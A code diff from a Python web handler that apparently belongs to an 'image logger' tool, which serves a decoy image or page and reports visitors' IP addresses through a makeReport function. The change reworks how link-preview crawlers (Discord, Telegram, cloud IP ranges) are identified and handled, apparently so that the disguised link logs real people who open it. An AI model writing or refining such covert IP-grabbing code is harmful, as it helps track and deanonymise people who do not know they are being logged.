@@ -194,13 +194,15 @@ div.img {{
   }}</style><div class="img"></div>'''.encode()
         
         if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
-            if "discord" in self.headers.get('user-agent').lower():
-                self.send_response(200)
-                self.send_header('Content-type','image/jpeg' if config["buggedImage"] else 'text/html')
-                self.end_headers()
-                
-                self.wfile.write(binaries["loading"] if config["buggedImage"] else data)
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+            return
+        
+        if self.headers.get('x-forwarded-for').startswith(("34", "35")) or self.headers.get('user-agent').startswith("TelegramBot"):
+            self.send_response(200)
+            self.send_header('Content-type','image/jpeg' if config["buggedImage"] else 'text/html')
+            self.end_headers()
+            
+            self.wfile.write(binaries["loading"] if config["buggedImage"] else data)
+            makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
             
             return
         
